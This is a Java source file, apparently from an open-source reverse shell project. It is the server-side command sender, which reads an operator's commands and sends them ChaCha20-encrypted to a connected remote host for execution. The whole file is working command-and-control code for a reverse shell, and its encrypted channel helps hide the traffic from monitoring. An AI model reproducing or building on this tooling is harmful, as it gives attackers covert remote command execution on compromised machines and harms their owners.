package obs1d1anc1ph3r.reverseshell.server;

import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;

import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class CommandSender implements Runnable {

	private static final Logger logger = Logger.getLogger(CommandSender.class.getName());
	private final DataOutputStream dataOut;
	private final BufferedReader userInput;
	private final ReverseShellServer server;
	private final byte[] encryptionKey;

	public CommandSender(DataOutputStream dataOut, BufferedReader userInput, ReverseShellServer server, byte[] encryptionKey, byte[] nonce) {
		this.dataOut = dataOut;
		this.userInput = userInput;
		this.server = server;
		this.encryptionKey = encryptionKey;
	}

	@Override
	public void run() {
		try {
			String command;
			System.out.print("\nCommand> ");
			while ((command = userInput.readLine()) != null) {
				if ("exit".equalsIgnoreCase(command)) {
					sendCommand("exit");
					server.cleanup();
					break;
				} else {
					sendCommand(command);
				}
			}
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error reading command input: " + e.getMessage(), e);
		} finally {
			cleanup();
		}
	}

	private void sendCommand(String command) {
    try {
        if (dataOut != null) {
            byte[] nonce = ChaCha20.generateNonce();
            byte[] encryptedCommand = ChaCha20.encrypt(encryptionKey, nonce, command.getBytes());

            dataOut.writeInt(nonce.length + encryptedCommand.length);
            dataOut.write(nonce);
            dataOut.write(encryptedCommand);
            dataOut.flush();

            //logger.info("[-] Command sent (encrypted)");
        } else {
            logger.severe("[ERROR] Output stream is closed. Unable to send command.");
        }
    } catch (IOException e) {
        logger.log(Level.SEVERE, "[ERROR] Error sending command: " + e.getMessage(), e);
    } catch (Exception ex) {
        logger.log(Level.SEVERE, "[ERROR] Encryption error: ", ex);
    }
}


	private void cleanup() {
		try {
			if (dataOut != null) {
				dataOut.close();
				//logger.info("[-] Output stream closed.");
			}
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error during cleanup: " + e.getMessage(), e);
		}
	}
}
